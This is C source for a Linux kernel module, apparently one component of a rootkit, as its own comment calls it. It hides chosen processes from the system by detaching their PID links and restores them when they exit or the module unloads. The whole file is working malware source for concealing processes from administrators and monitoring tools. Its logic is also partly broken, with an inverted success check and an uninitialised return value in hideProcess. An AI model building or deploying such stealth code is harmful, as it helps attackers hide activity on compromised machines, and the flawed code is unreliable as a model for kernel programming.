#include <linux/pid.h>
#include <linux/sched.h> // for task_struct
#include <linux/rculist.h>
#include <linux/profile.h>
#include <linux/kernel.h>
#include <linux/slab.h>

#include "common.h"
#include "processHider.h"
#include "readdirHijack.h"
#include "processHiderPidManipulation.h"
#include "HiddenProcessCollection.h"

#ifndef CONFIG_PROFILING
	#error "this module requires config profiling enabled"
#endif


static HiddenProcessCollection collection = NULL;

// Function Prototypes
static RestorableHiddenTask hideProcessGivenRcuLockIsHeld(int pidNumber);
static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task);
static void restoreTaskGivenRcuLockIsHeldAndFreeEntry(RestorableHiddenTask entry);
static void unhideAllHiddenTasksGivenLockIsHeld(void);
//


struct notifier_block notificationOnProcessExit = {
	.notifier_call = notificationFunctionOnTaskExit,
	.next = NULL,// TODO: CHECK THIS
	.priority = INT_MAX, // if there are multiple tasks registered for exit notifications it is desirable that the rootkit is called first so that it can restore the task.
};

//TODO: move this higher in the file
int processHider_init(void) {
	int error;
	collection = createHiddenProcessCollection();
	if (collection == NULL) {
		return -1;
	}

	// this will fail if profiling is disabled
	error = profile_event_register(PROFILE_TASK_EXIT, &notificationOnProcessExit);
	if (error != 0) { //todo : extract function..
		destoryHiddenProcessCollection(collection);
		return error;
	}

	return 0;
}


void processHider_exit(void) {
	// perhaps kill hidden processes / require that the tasks are dead first..

	//TODO: check that a race condition does not exist when exiting e.g. if a process exits at the same time

	int error;
	rcu_read_lock();

	error = profile_event_unregister(PROFILE_TASK_EXIT, &notificationOnProcessExit);

	unhideAllHiddenTasksGivenLockIsHeld();

	destoryHiddenProcessCollection(collection);
	collection = NULL;

	rcu_read_unlock();
}

//returns error code...
int hideProcess(int pidNumber) {
	int result;
	
	if (isHiddenProcessCollectionFull(collection)) {
		printError("Failed to hide process. Too may processes are hidden.\n");
		result = -1;
	} else {
		rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h

		RestorableHiddenTask hiddenTask = hideProcessGivenRcuLockIsHeld(pidNumber);


		if (hiddenTask != NULL) {
			result = -1;
			printError("failed to hide task\n");
		} else {
			addHiddenProcessToCollection(collection, hiddenTask);
		}

		rcu_read_unlock();
	}
	
	return result;
}

int showProcess(int pid) {
	rcu_read_lock();

	if (isPidInCollection(collection, pid)) {
		RestorableHiddenTask entry = removePidFromCollection(collection, pid);
		restoreTaskGivenRcuLockIsHeldAndFreeEntry(entry);
	}

	rcu_read_unlock();
	return 0;
}

static RestorableHiddenTask createRestorableTask(struct task_struct *task, struct pid *originalPid, int pidNumber) {
	RestorableHiddenTask result = kmalloc(sizeof(struct restorableHiddenTask),__GFP_NOWARN);

	if (result != NULL) {
		result->task = task;
		result->originalPid = originalPid;
		result->pidNumber = pidNumber;
	}

	return result;
}

static RestorableHiddenTask hideProcessGivenRcuLockIsHeld(int pidNumber) {
	struct task_struct *task;
	struct pid *originalPid;
	struct pid *pid = find_get_pid(pidNumber); //todo: check allocation fo this...

	if (pid == NULL) {
		return NULL;
	}

	task = pid_task(pid, PIDTYPE_PID);

	if (task == NULL) {
		return NULL;
	}


	originalPid = detachPidAndGetOldPid(task, PIDTYPE_PID);
	return createRestorableTask(task, originalPid, pidNumber);
}

static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task) {
	//printInfo("in notification function for exit - task is %p\n", task);

	if (isTaskInCollection(collection, task)) {
		RestorableHiddenTask entry = removeTaskFromCollection(collection, task);
		rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h

		restoreTaskGivenRcuLockIsHeldAndFreeEntry(entry);

		rcu_read_unlock();
	}

	return 0;
}

static void restoreTaskGivenRcuLockIsHeldAndFreeEntry(RestorableHiddenTask entry) {
	printInfo("Unhiding task\n");
	attach_pid(entry->task, PIDTYPE_PID, entry->originalPid);
	kfree(entry);
}


static void unhideAllHiddenTasksGivenLockIsHeld(void) {
	RestorableHiddenTask entry = removeAnyHiddenTask(collection);
	while (entry != NULL) {
		restoreTaskGivenRcuLockIsHeldAndFreeEntry(entry);
		entry = removeAnyHiddenTask(collection);
	}
}
